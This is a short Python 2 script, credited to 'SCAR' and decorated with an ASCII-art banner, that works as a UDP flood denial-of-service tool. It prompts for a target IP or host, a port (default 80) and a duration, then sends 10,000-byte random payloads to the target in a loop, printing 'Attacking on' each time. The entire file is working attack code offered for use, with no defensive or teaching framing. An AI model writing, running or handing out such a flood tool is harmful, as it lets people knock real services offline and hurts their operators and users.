#!/usr/bin/python
#---!coded by SCAR(At) 
#colors
wi = "\033[1;37m" 
rd = "\033[0;31m" 
gr = "\033[1;32m" 
yl = "\033[1;33m" 
pu = "\033[1;35m" 
#------------------
import os
import socket
import time 
import random
import sys
#------------------#

def doss():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    payloads = random._urandom(10000)

    os.system("clear")
    print gr+'''      
    
        
                                         ------------------------------------------------------------------

                                       ####                    @@@@             ###              @@@@  
                                       #                     @                #     #            @      @
                                       #                     @                #     #            @      @
                                         ###                 @                 ####              @  @@@@       
                                             #               @                #     #            @      @
                                             #               @                #     #            @       @ 
                                          ####               @                #     #            @          @
                                                               @@@@  
    '''                                   
    print '''
                               

    '''
    print'\n'
    print'\n'
    ip = raw_input(rd+" set ip or host Target =======> : ")
    port = input(wi+" set port [Default port 80 ] ======> :")
    seconds = input(yl+" set time to start======> : ")
    timeout = time.time() + seconds

    sent = 10 

    while True:

        try:

            if time.time() > timeout:
                break

            else:
                pass
            sock.sendto(payloads,(ip,port))
            sent = sent + 1 
            print (gr+'  Attacking on %s .... ') % (ip)
        except KeyboardInterrupt:
            sys.exit()

doss()
print (" Done....! ")
print (wi+" Have a good day ")
